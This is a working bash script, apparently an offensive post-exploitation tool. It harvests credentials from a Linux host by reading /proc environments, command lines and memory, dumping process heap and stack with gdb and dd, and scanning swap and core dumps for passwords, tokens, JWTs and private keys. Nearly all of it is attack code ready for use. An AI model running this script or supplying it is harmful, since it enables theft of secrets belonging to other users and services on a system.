#!/bin/bash
# Memory Credential Extraction
# Usage: ./memory_creds.sh --scan <process_name>
#        ./memory_creds.sh --dump <process_name>
#        ./memory_creds.sh --swap
#        ./memory_creds.sh --environ

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'

PATTERNS='password|passwd|secret|token|api_key|bearer|authorization|session_id|JSESSIONID|connect_string|Data Source|mysql.*-p|BEGIN.*PRIVATE KEY|eyJ[A-Za-z0-9_-]*\.eyJ'

scan_process() {
    local PROC="$1"
    if [ -z "$PROC" ]; then
        echo "Usage: $0 --scan <process_name|PID>"
        exit 1
    fi

    echo -e "${GREEN}=== Memory Credential Scan: $PROC ===${NC}\n"

    # Find PIDs
    if [[ "$PROC" =~ ^[0-9]+$ ]]; then
        PIDS="$PROC"
    else
        PIDS=$(pgrep -x "$PROC" 2>/dev/null || pgrep -f "$PROC" 2>/dev/null)
    fi

    if [ -z "$PIDS" ]; then
        echo -e "${RED}[!] Process not found: $PROC${NC}"
        exit 1
    fi

    for pid in $PIDS; do
        PROC_NAME=$(cat "/proc/$pid/comm" 2>/dev/null)
        PROC_USER=$(ps -o user= -p "$pid" 2>/dev/null)
        echo -e "${YELLOW}[*] PID: $pid ($PROC_NAME) — User: $PROC_USER${NC}\n"

        # Read /proc/PID/maps for memory regions
        if [ -r "/proc/$pid/maps" ]; then
            echo -e "${YELLOW}[*] Memory maps:${NC}"
            wc -l < "/proc/$pid/maps"
            echo " memory regions"
        fi

        # Search /proc/PID/environ
        echo -e "\n${YELLOW}[*] Environment variables:${NC}"
        ENV_SECRETS=$(cat "/proc/$pid/environ" 2>/dev/null | tr '\0' '\n' | grep -iE "$PATTERNS")
        if [ -n "$ENV_SECRETS" ]; then
            echo -e "${RED}[!] Secrets in environment:${NC}"
            echo "$ENV_SECRETS" | sed 's/^/    /'
        else
            echo "    (no obvious secrets)"
        fi

        # Search /proc/PID/cmdline
        echo -e "\n${YELLOW}[*] Command line:${NC}"
        CMD=$(cat "/proc/$pid/cmdline" 2>/dev/null | tr '\0' ' ')
        echo "    $CMD"
        if echo "$CMD" | grep -qiE "$PATTERNS"; then
            echo -e "${RED}[!] Credentials in command line!${NC}"
        fi

        # strings on /proc/PID/mem (if accessible)
        if [ -r "/proc/$pid/mem" ]; then
            echo -e "\n${YELLOW}[*] Searching process memory with strings...${NC}"
            FOUND=$(strings "/proc/$pid/mem" 2>/dev/null | grep -iE "$PATTERNS" | head -20)
            if [ -n "$FOUND" ]; then
                echo -e "${RED}[!] Potential credentials in memory:${NC}"
                echo "$FOUND" | sed 's/^/    /'
            fi
        else
            echo -e "\n${YELLOW}[*] /proc/$pid/mem not readable (need same user or root)${NC}"
            echo -e "${YELLOW}[*] Try: gdb -p $pid -batch -ex 'generate-core-file /tmp/core.$pid'${NC}"
        fi

        echo ""
    done
}

dump_process() {
    local PROC="$1"
    if [ -z "$PROC" ]; then
        echo "Usage: $0 --dump <process_name|PID>"
        exit 1
    fi

    echo -e "${GREEN}=== Process Memory Dump ===${NC}\n"

    if [[ "$PROC" =~ ^[0-9]+$ ]]; then
        PID="$PROC"
    else
        PID=$(pgrep -x "$PROC" 2>/dev/null | head -1)
    fi

    if [ -z "$PID" ]; then
        echo -e "${RED}[!] Process not found: $PROC${NC}"
        exit 1
    fi

    DUMPFILE="/tmp/memdump_${PID}_$(date +%s)"

    echo -e "${YELLOW}[*] Dumping PID $PID...${NC}\n"

    # Method 1: gdb
    if which gdb >/dev/null 2>&1; then
        echo -e "${YELLOW}[*] Method 1: gdb core dump${NC}"
        echo "  gdb -p $PID -batch -ex 'generate-core-file ${DUMPFILE}.core' -ex detach -ex quit"
        gdb -p "$PID" -batch -ex "generate-core-file ${DUMPFILE}.core" -ex detach -ex quit 2>/dev/null
        if [ -f "${DUMPFILE}.core" ]; then
            echo -e "${GREEN}[+] Dump saved: ${DUMPFILE}.core${NC}"
            echo -e "${YELLOW}[*] Search: strings ${DUMPFILE}.core | grep -iE 'password|token|secret'${NC}"
        fi
    fi

    # Method 2: /proc/PID/mem reading
    echo -e "\n${YELLOW}[*] Method 2: /proc/$PID/mem dump (heap regions)${NC}"
    if [ -r "/proc/$PID/maps" ] && [ -r "/proc/$PID/mem" ]; then
        grep 'heap\|stack' "/proc/$PID/maps" | while read -r line; do
            START=$(echo "$line" | cut -d'-' -f1)
            END=$(echo "$line" | cut -d'-' -f2 | cut -d' ' -f1)
            REGION=$(echo "$line" | awk '{print $NF}')
            dd if="/proc/$PID/mem" bs=1 skip=$((16#$START)) count=$(($((16#$END)) - $((16#$START)))) of="${DUMPFILE}_${REGION}" 2>/dev/null
            echo "  Dumped $REGION: ${DUMPFILE}_${REGION}"
        done
    fi

    # Method 3: procdump (if available)
    if which procdump >/dev/null 2>&1; then
        echo -e "\n${YELLOW}[*] Method 3: procdump${NC}"
        echo "  procdump -p $PID ${DUMPFILE}.dmp"
    fi

    echo -e "\n${YELLOW}[*] Analysis commands:${NC}"
    echo "  strings -n 8 ${DUMPFILE}* | grep -iE 'password|token|secret|api_key|bearer|eyJ'"
    echo "  strings -n 8 ${DUMPFILE}* | grep -oP 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+'"
    echo "  strings -n 8 ${DUMPFILE}* | grep -E '-----BEGIN .* PRIVATE KEY-----'"
}

scan_swap() {
    echo -e "${GREEN}=== Swap File / Partition Credential Scan ===${NC}\n"

    echo -e "${YELLOW}[*] Swap partitions:${NC}"
    swapon --show 2>/dev/null || cat /proc/swaps

    echo -e "\n${YELLOW}[*] Searching swap for credentials...${NC}"
    # Find swap partition/file
    SWAP=$(swapon --show=NAME --noheadings 2>/dev/null || awk '/^\//{print $1}' /proc/swaps)
    for s in $SWAP; do
        if [ -r "$s" ]; then
            echo -e "${YELLOW}[*] Scanning $s (this may take a while)...${NC}"
            strings "$s" 2>/dev/null | grep -iE "$PATTERNS" | sort -u | head -30 | while read -r line; do
                echo -e "${RED}[!] $line${NC}"
            done
        else
            echo -e "${YELLOW}[*] $s not readable (need root)${NC}"
        fi
    done

    # Core dumps
    echo -e "\n${YELLOW}[*] Core dump files:${NC}"
    find / -name 'core' -o -name 'core.*' -o -name '*.core' 2>/dev/null | grep -v proc | while read -r f; do
        echo -e "${YELLOW}[*] Core dump: $f${NC}"
        echo "  strings $f | grep -iE 'password|token|secret' | head -10"
    done
}

scan_environ() {
    echo -e "${GREEN}=== Process Environment Secrets ===${NC}\n"

    for pid in $(ls /proc/ 2>/dev/null | grep '^[0-9]'); do
        [ -r "/proc/$pid/environ" ] || continue
        SECRETS=$(cat "/proc/$pid/environ" 2>/dev/null | tr '\0' '\n' | grep -iE 'password|secret|token|api_key|database_url|redis_url')
        if [ -n "$SECRETS" ]; then
            PROC_NAME=$(cat "/proc/$pid/comm" 2>/dev/null)
            PROC_USER=$(ps -o user= -p "$pid" 2>/dev/null)
            echo -e "${RED}[!] PID $pid ($PROC_NAME) — $PROC_USER:${NC}"
            echo "$SECRETS" | sed 's/^/    /'
            echo ""
        fi
    done
}

case "$1" in
    --scan)    scan_process "$2" ;;
    --dump)    dump_process "$2" ;;
    --swap)    scan_swap ;;
    --environ) scan_environ ;;
    *)
        echo "Usage: $0 --scan <process_name|PID>   # Scan process memory for creds"
        echo "       $0 --dump <process_name|PID>   # Full memory dump"
        echo "       $0 --swap                       # Scan swap for creds"
        echo "       $0 --environ                    # Scan all process environments"
        ;;
esac
